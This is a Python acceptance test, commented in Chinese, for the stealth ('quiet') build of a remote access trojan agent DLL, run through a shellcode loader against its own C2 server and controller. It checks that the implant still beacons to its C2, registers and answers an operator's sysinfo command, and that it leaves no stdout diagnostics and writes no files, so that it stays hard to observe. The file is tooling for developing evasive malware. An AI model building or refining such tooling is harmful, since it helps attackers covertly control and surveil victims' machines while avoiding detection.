# e2e_quiet.py — 静默构建验收（RAT_AGENT_DEBUG=0）
#
# 验证静默版 DLL：**功能照常、可观测面最小**
#   1) 仍能上线（无 autostart.args ⇒ 内置默认配置 beacon 127.0.0.1:8080）
#   2) 仍能应答指令（sysinfo）
#   3) stdout 无任何 agent 诊断输出（宿主自己的输出仍在）
#   4) 磁盘零写入：不建 %LOCALAPPDATA%\RatAgent、不写 agent.log、不写 agent.id
#
# 前置（见 docs/PROGRESS.md §8.6）：
#   build/e2e/out_quiet.bin   ← 用 -p:RatAgentDebug=0 编出 DLL 后，在 Kali 上 cpl link
#   build/bin/c2server.exe / ratctl.exe
#   build/runpic/bin/runpic.exe
import os
import shutil
import subprocess
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
RUNPIC = os.path.join(ROOT, "build", "runpic", "bin", "runpic.exe")
C2 = os.path.join(ROOT, "build", "bin", "c2server.exe")
RATCTL = os.path.join(ROOT, "build", "bin", "ratctl.exe")
QUIET_BIN = os.path.join(ROOT, "build", "e2e", "out_quiet.bin")
WORK = os.path.join(ROOT, "build", "e2e", "quiet")
HOME_Q = os.path.join(WORK, "home")   # 覆盖 LOCALAPPDATA，且**故意不创建**
RUN_LOG = os.path.join(WORK, "runpic.log")
C2_LOG = os.path.join(WORK, "c2server.log")

ENV = dict(os.environ)
ENV["LOCALAPPDATA"] = HOME_Q

ok = True


def check(name, cond, detail=""):
    global ok
    print(f"[{'PASS' if cond else 'FAIL'}] {name} {detail}")
    if not cond:
        ok = False


def read(p):
    try:
        with open(p, "r", encoding="utf-8", errors="replace") as f:
            return f.read()
    except OSError:
        return ""


def main():
    for p in (QUIET_BIN, RUNPIC, C2, RATCTL):
        check(f"prereq {os.path.relpath(p, ROOT)}", os.path.exists(p))
    if not ok:
        print("== RESULT: PREREQ MISSING")
        return 1

    # 清工作区（home 目录本身不建，用来验证"零文件"）
    shutil.rmtree(WORK, ignore_errors=True)
    os.makedirs(WORK, exist_ok=True)

    srv = runpic = None
    try:
        with open(C2_LOG, "w", encoding="utf-8", errors="replace") as f:
            srv = subprocess.Popen([C2], stdout=f, stderr=subprocess.STDOUT, env=ENV)
        time.sleep(1)

        with open(RUN_LOG, "w", encoding="utf-8", errors="replace") as f:
            runpic = subprocess.Popen([RUNPIC, QUIET_BIN, "--hold", "-1"],
                                      stdout=f, stderr=subprocess.STDOUT, env=ENV)

        # 1) 仍能上线
        t0 = time.time()
        while time.time() - t0 < 30:
            if "registered (first GET)" in read(C2_LOG):
                break
            time.sleep(0.5)
        c2txt = read(C2_LOG)
        reg = next((l for l in c2txt.splitlines() if "registered" in l), "")
        check("静默版仍能上线(无触发器文件 -> 默认配置)", bool(reg), reg)

        # 2) 仍能应答指令
        aid = ""
        for tok in reg.replace("[", " ").replace("]", " ").split():
            if len(tok) == 32 and all(c in "0123456789abcdef" for c in tok):
                aid = tok
        if aid:
            p = subprocess.run([RATCTL, "-s", "127.0.0.1:4444"],
                               input=f"use {aid}\nsysinfo\nexit\n",
                               capture_output=True, text=True, timeout=60, env=ENV)
            out = (p.stdout or "") + (p.stderr or "")
            check("静默版仍能应答 sysinfo", "OS:" in out and "HOST:" in out, repr(out[-80:]))
        else:
            check("取得 agent_id", False, "服务器日志里没找到 32 位 id")

        # 3) stdout 静默
        rtxt = read(RUN_LOG)
        check("宿主自身输出仍在(loader 正常跑)", "loader thread exited" in rtxt)
        leaked = [s for s in ("[beacon]", "agent_start mode=", "autostart", "[stream]")
                  if s in rtxt]
        check("agent 诊断输出为 0 条", not leaked, f"leaked={leaked}")

        # 4) 磁盘零写入
        check("未创建 %LOCALAPPDATA%\\RatAgent 目录", not os.path.exists(HOME_Q), HOME_Q)
        check("未生成 <module>.log",
              not os.path.exists(os.path.join(HOME_Q, "RatAgent", "full.log")))
        check("未生成 <module>.id",
              not os.path.exists(os.path.join(HOME_Q, "RatAgent", "full.id")))
    finally:
        if runpic and runpic.poll() is None:
            runpic.kill()
            runpic.wait(timeout=5)
        if srv:
            srv.terminate()
            try:
                srv.wait(timeout=5)
            except subprocess.TimeoutExpired:
                srv.kill()

    print("== RESULT:", "ALL PASS" if ok else "FAILURES PRESENT")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
